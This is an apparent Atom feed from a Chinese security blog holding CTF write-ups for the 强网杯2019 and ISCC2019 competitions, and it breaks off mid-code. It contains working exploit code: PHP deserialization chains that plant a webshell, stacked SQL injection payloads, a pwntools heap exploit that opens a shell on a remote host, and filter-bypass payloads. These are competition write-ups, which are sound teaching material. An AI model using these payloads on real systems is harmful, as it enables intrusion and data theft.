<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cryscat&#39;s Blog</title>
  
  <subtitle>一只安全狗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.cryscat.com/"/>
  <updated>2019-05-31T17:36:14.000Z</updated>
  <id>http://www.cryscat.com/</id>
  
  <author>
    <name>Cryscat</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>强网杯2019部分Writeup</title>
    <link href="http://www.cryscat.com/2019/05/27/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://www.cryscat.com/2019/05/27/强网杯2019部分Writeup/</id>
    <published>2019-05-27T14:47:35.000Z</published>
    <updated>2019-05-31T17:36:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>正常注册登录进去是一个上传文件的页面，并且发现header cookie中多了一个user，是一段base64加密的序列化字符串。再上传页面试了一波上传文件的操作都没找到什么突破口。之后扫了扫网站目录发现了<code>www.tar.gz</code>文件。</p><p>审计网站源码，在/application/web/controller/下的Index.php发现反序列化的地方<br><img src="/2019/05/27/强网杯2019部分Writeup/1.jpg"></p><p>在Profile.php文件中发现有一个copy操作可复制文件，可利用这一点来将我们上传的图片马改为php文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">$curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line"><span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line"><span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先生成图片马<br><img src="/2019/05/27/强网杯2019部分Writeup/2.jpg"></p><p>exp1：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename_tmp = <span class="string">'./upload/ddc98a6700dc0bc43925665763fcf036/f3ccdd27d2000e3f9255a7e3e2c48800.png'</span>;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="string">'./upload/ddc98a6700dc0bc43925665763fcf036/cryscat.php'</span>;</span><br><span class="line"><span class="keyword">public</span> $ext = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $checker;</span><br><span class="line"><span class="keyword">public</span> $registed = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Register();</span><br><span class="line">$res = serialize($a);</span><br><span class="line"><span class="keyword">print</span>($res);</span><br><span class="line"><span class="keyword">print</span>(base64_encode($res));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>pop链1: <code>Register-&gt;__destruct</code>—&gt; <code>Register-&gt;checker-&gt;index()</code>—&gt;<code>Profile-&gt;__call</code>—&gt;<code>Profile-&gt;__get</code>—&gt;<code>upload_img()</code>—&gt;<code>copy</code></p></blockquote><p>exp2:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename_tmp = <span class="string">'./upload/ddc98a6700dc0bc43925665763fcf036/f3ccdd27d2000e3f9255a7e3e2c48800.png'</span>;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="string">'./upload/ddc98a6700dc0bc43925665763fcf036/cryscat.php'</span>;</span><br><span class="line"><span class="keyword">public</span> $ext = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> $index = <span class="string">'upload_img'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $checker;</span><br><span class="line"><span class="keyword">public</span> $registed = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Register();</span><br><span class="line">$res = serialize($a);</span><br><span class="line"><span class="keyword">print</span>($res);</span><br><span class="line"><span class="keyword">print</span>(base64_encode($res));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>pop链2: <code>Register-&gt;__destruct</code>—&gt; <code>Register-&gt;checker-&gt;index()</code>—&gt;<code>Profile-&gt;__call</code>—&gt;<code>upload_img()</code>—&gt;<code>copy</code></p></blockquote><img src="/2019/05/27/强网杯2019部分Writeup/3.jpg"><p>复制base64部分替换cookie中user的值，直接刷新页面即可<br><img src="/2019/05/27/强网杯2019部分Writeup/4.jpg"></p><p>图片马重命名成功<br><img src="/2019/05/27/强网杯2019部分Writeup/5.jpg"></p><h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>主页直接提示了<code>www.tar.gz</code>文件，解压下来有三千多个php文件……大致翻看了几个文件感觉这一题就是单纯的找后门。遍历文件，将每个文件的GET或者POST方式获得的参数名提取出来，赋值爆破出后门密码。这里我选取了代码执行和命令执行都通用的echo命令。</p><p>python脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">'/Library/WebServer/Documents/src/'</span>)</span><br><span class="line">method = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:</span><br><span class="line">content = open(<span class="string">'/Library/WebServer/Documents/src/'</span>+i,<span class="string">'r'</span>).read()</span><br><span class="line">print(<span class="string">'*'</span>*<span class="number">20</span>+i+<span class="string">'*'</span>*<span class="number">20</span>)</span><br><span class="line">gepost = method.findall(content)</span><br><span class="line">url = <span class="string">'http://127.0.0.1/src/'</span></span><br><span class="line">cmd = <span class="string">'=echo "cryscat";'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> gepost:</span><br><span class="line"><span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> j:</span><br><span class="line">pdget = re.findall(<span class="string">r"'(.*)'"</span>,j)[<span class="number">0</span>]</span><br><span class="line">urlg = url+i+<span class="string">'?'</span>+pdget+cmd</span><br><span class="line">res = r.get(urlg)</span><br><span class="line">print(<span class="string">'------&gt; '</span>+pdget)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'cryscat'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(<span class="string">'Success!!! ------&gt; '</span>+urlg)</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'POST'</span> <span class="keyword">in</span> j:</span><br><span class="line">pdpost = re.findall(<span class="string">r"'(.*)'"</span>,j)[<span class="number">0</span>]</span><br><span class="line">data = &#123;</span><br><span class="line">pdpost:cmd</span><br><span class="line">&#125;</span><br><span class="line">urlp = url+i</span><br><span class="line">res = r.post(urlp,data=data)</span><br><span class="line">print(<span class="string">'------&gt; '</span>+pdpost)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'cryscat'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(<span class="string">'Success!!! ------&gt; '</span>+urlp+<span class="string">'  '</span>+data)</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>结果<br><img src="/2019/05/27/强网杯2019部分Writeup/6.jpg"></p><blockquote><p>另外本题还可以用vld插件提取每一个文件的opcode，最终只会看到一个动态函数执行，这就是后门文件</p></blockquote><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>本题一开始我注出了表名<code>supersqli</code>，后续测试发现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure></p><p>禁用了select确实不是一个常规的sql注入……<br>可堆叠注入：</p><blockquote><p>1’;show tables;</p></blockquote><img src="/2019/05/27/强网杯2019部分Writeup/7.jpg"><blockquote><p>1’;show create table `1919810931114514`</p></blockquote><img src="/2019/05/27/强网杯2019部分Writeup/8.jpg"><p>可见flag就在<code>1919810931114514</code>表中，但是该怎么查出内容呢。<br>主页的查询是按id在words表中进行字段内容查询的，根据这一点我们可以将flag所在的表名改为<code>words</code>，由此查出flag（注意此时flag所在表也需要存在id列）</p><p>payload:</p><blockquote><p>1’;alter table `1919810931114514` add id int default ‘1’;alter table words rename test;alter table `1919810931114514` rename words;</p></blockquote><img src="/2019/05/27/强网杯2019部分Writeup/9.jpg"><p>-—————————————————————————–<br>以下姿势来自Mochazz师傅<br>预编译构造带有 select 的 sql 语句</p><blockquote><p>1’;Set @sql=concat(‘sel’,’ect * from <code>1919810931114514</code>‘); prepare presql from @sql; execute presql; deallocate prepare presql;<br>(Set大写绕过strstr)</p></blockquote><img src="/2019/05/27/强网杯2019部分Writeup/10.jpg"><h1 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h1><p>发现/1/runtime/log/201903/12.log日志文件中存在th5远程代码执行的payload，猜测本题是通过此payload  getshell<br><img src="/2019/05/27/强网杯2019部分Writeup/11.jpg"></p><h1 id="强网先锋-AP"><a href="#强网先锋-AP" class="headerlink" title="强网先锋-AP"></a>强网先锋-AP</h1><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process("./task_main")</span></span><br><span class="line"><span class="comment">#e = ELF('./task_main')</span></span><br><span class="line">p = remote(<span class="string">'117.78.60.139'</span>, <span class="string">'31278'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getT</span><span class="params">(size, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeT</span><span class="params">(index, size, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"name?\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"name!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openT</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"open?\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getT(<span class="number">10</span>, <span class="string">'123'</span>)</span><br><span class="line">getT(<span class="number">10</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">changeT(<span class="number">0</span>, <span class="number">50</span>, <span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">openT(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">binsh = puts = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(binsh)</span><br><span class="line">changeT(<span class="number">0</span>, <span class="number">50</span>, <span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">openT(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">puts = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">libc = puts<span class="number">-0x6F690</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">system = libc+<span class="number">0x45390</span></span><br><span class="line">changeT(<span class="number">0</span>, <span class="number">100</span>, <span class="string">'a'</span>*<span class="number">32</span>+p64(binsh)+p64(system))</span><br><span class="line">openT(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h1 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋-AD"></a>强网先锋-AD</h1><p>跟进加密函数，发现是base64加密<br>此语句相当于<code>v4 i  ≠  v5 i</code>,所以是从v5开始对比<br><img src="/2019/05/27/强网杯2019部分Writeup/12.jpg"><br><img src="/2019/05/27/强网杯2019部分Writeup/13.jpg"></p><p>从v5开始提出字符，解密获得flag</p><h1 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h1><p>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line">e=mpz(<span class="number">65537</span>)</span><br><span class="line">c1=mpz(<span class="number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>)</span><br><span class="line">n1=mpz(<span class="number">14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span>)</span><br><span class="line"></span><br><span class="line">c2=mpz(<span class="number">3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470</span>)</span><br><span class="line">n2=mpz(<span class="number">14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span>)</span><br><span class="line">m2=mpz(bytes_to_long(<span class="string">"1"</span>*<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">q=gcd(n1,n2)</span><br><span class="line">p1=n1/q</span><br><span class="line">r1=(p1<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1=invert(e,r1)</span><br><span class="line"></span><br><span class="line">m=pow(c1,d1,n1)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure></p><img src="/2019/05/27/强网杯2019部分Writeup/14.jpg"><h1 id="强网先锋-打野"><a href="#强网先锋-打野" class="headerlink" title="强网先锋-打野"></a>强网先锋-打野</h1><p>附件是一张bmp图片，LSB隐写<br>可通过LSB_hide工具直接提取出信息<br><img src="/2019/05/27/强网杯2019部分Writeup/15.jpg"></p><p>也可以用zsteg<br><img src="/2019/05/27/强网杯2019部分Writeup/16.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;upload&quot;&gt;&lt;a href=&quot;#upload&quot; class=&quot;headerlink&quot; title=&quot;upload&quot;&gt;&lt;/a&gt;upload&lt;/h1&gt;&lt;p&gt;正常注册登录进去是一个上传文件的页面，并且发现header cookie中多了一个user，是一段base6
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://www.cryscat.com/tags/Writeup/"/>
    
      <category term="CTF" scheme="http://www.cryscat.com/tags/CTF/"/>
    
      <category term="强网杯" scheme="http://www.cryscat.com/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2019 Web Writeup</title>
    <link href="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/"/>
    <id>http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/</id>
    <published>2019-05-22T13:19:29.000Z</published>
    <updated>2019-05-28T06:11:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>首先要求我们传入的数组value经过chr函数转为ascii拼接后构成<code>w3lc0me_To_ISCC2019</code>字符串，但<code>$value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127</code>部分代码限制了数组的键值的范围，这就与构成字符的要求矛盾。这时候可以利用chr()函数的自动取模功能进行绕过，当参数大于256时，chr函数会对输入的数字自动取模256，所以我们在原数组上每个键值增加256就行了。</p><p>最后一个if语句看似很矛盾<code>intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)</code>。给intval()传入十六进制字符串或者科学计数法表示的字符串时，intval会出错为0。但+1后intval参数已经转换为十进制数字，可绕过if判断。</p><blockquote><p>payload:?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0xbbb</p></blockquote><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>打开链接是一个登录界面，要我们爆破admin的三位数密码。主要难点是绕过验证码，这道题的验证码生成是基于cookie的。将phpsessid清空就可绕过验证码直接进行密码爆破</p><img src="/2019/05/22/ISCC2019-Web-Writeup/1.jpg"><img src="/2019/05/22/ISCC2019-Web-Writeup/2.jpg"><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>一道二次注入，注册<code>admin&#39;***#</code>形式的用户名，密码随意，然后登进去修改密码，此时修改的密码即为admin的密码，登录admin getflag。猜测修改密码部分后台代码<code>update users set password=&#39;?&#39; where username=&#39;?&#39;</code></p><img src="/2019/05/22/ISCC2019-Web-Writeup/3.jpg"><img src="/2019/05/22/ISCC2019-Web-Writeup/4.jpg"><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>又一道代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 